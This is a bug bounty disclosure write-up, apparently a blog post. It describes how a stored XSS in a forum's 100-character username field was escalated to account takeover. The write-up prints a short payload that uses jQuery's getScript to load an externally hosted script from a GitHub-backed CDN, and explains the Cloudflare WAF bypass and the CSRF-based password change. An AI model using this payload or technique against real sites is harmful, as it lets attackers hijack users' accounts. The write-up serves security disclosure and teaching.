---
title: "From Stored XSS to Account Takeover with Limited Characters, jQuery, and GitHub"
layout: post
author: Erik Villegas
---

A **Stored XSS vulnerability** was identified in the username field of a forum, limited to 100 characters, which restricted the use of standard payloads.  

By extracting the **CSRF token** and sending a crafted request to update account detail, without requiring the current password, the issue escalated to an **account takeover**.

Despite Cloudflare being present as a WAF, its protection proved ineffective, and the use of **jQuery** enabled loading external scripts with minimal payload size, bypassing both character limits and filtering.

## The Idea

Embedding a malicious script inline would exceed the 100-character limit and increase the likelihood of detection by the WAF.  
Instead, the attack leveraged **jQuery’s script-loading function** to dynamically retrieve malicious code from a CDN.  

The payload was hosted in a public **GitHub repository** and delivered through a third-party CDN (`cdn.jsdelivr.net`).

This method significantly reduced the payload size, keeping it within the character limit while evading filtering mechanisms.

## Exploitation

The payload loaded my external script, which performed two main actions:  
1. Extract the CSRF token from the `/profile` endpoint.  
2. Send a crafted `POST` request to update the victim’s profile, including the password field.  

Because the application didn’t require the old password for updates, this resulted in a **direct account takeover**.

## Steps to Reproduce

1. **Create a malicious JavaScript file** in a GitHub repository.  

The following image shows the hosted code that retrieves the CSRF token and sends the POST request to change the victim’s password:

<img width="1444" height="492" alt="GitHub script hosting" src="https://github.com/user-attachments/assets/1cf88fbf-49f2-48a7-ad00-86f52bd35348" />

2. **Serve it through a CDN** linked to the repository, for example:  

`https://cdn.jsdelivr.net/gh/{GitHubUser}/{repo}/{file}`

<img width="1029" height="224" alt="Script served via CDN" src="https://github.com/user-attachments/assets/c23a5c6a-978b-44c9-8b80-c003cfa47044" />

3. **Craft the Stored XSS payload** with jQuery (under 100 characters) to load the external script:  

```html
<svg/onclick=$.getScript("//cdn.jsdelivr.net/gh/userGitHub/js/3.js")>
```

The following image is the Stored XSS payload leveraging jQuery to load external script:

<img width="1128" height="448" alt="Stored XSS Payload" src="https://github.com/user-attachments/assets/06bb7b57-cd14-4da1-89eb-177d7c536c13" />

4. Once the payload executes in the victim’s browser, the script retrieves the CSRF token and updates the profile:

<img width="900" height="573" alt="Account Takeover HTTP Request" src="https://github.com/user-attachments/assets/f3419dd8-f499-4768-8d51-06b3f4a18705" />

Victim’s account password successfully changed.

## Impact

By chaining a **Stored XSS** with **CSRF token extraction** and a weak profile update policy, this attack escalated to a **full account takeover**.

Key factors that enabled this exploitation:
- 100-character limit bypassed via **jQuery script loader**.
- External code hosted on **GitHub + CDN**.
- **Cloudflare WAF bypassed** with minimal obfuscation.
- No password verification required for account updates.

## Timeline & Bounty

- **December 14, 2024** – Vulnerability discovered during testing
- **December 14, 2024** – Initial report submitted to the program
- **December 25, 2024** – Triaged and confirmed by the security team
- **December 27, 2024** – Updated report: XSS impact escalated to Account Takeover
- **January 20, 2025** – **Reward:** $200 bounty (maximum payout for ATO in this program)

<img width="281" height="667" alt="BountyReward" src="https://github.com/user-attachments/assets/60b9fc38-127c-4cb8-b7fc-4a63cced3ebe" />

**Author:** Erik Villegas
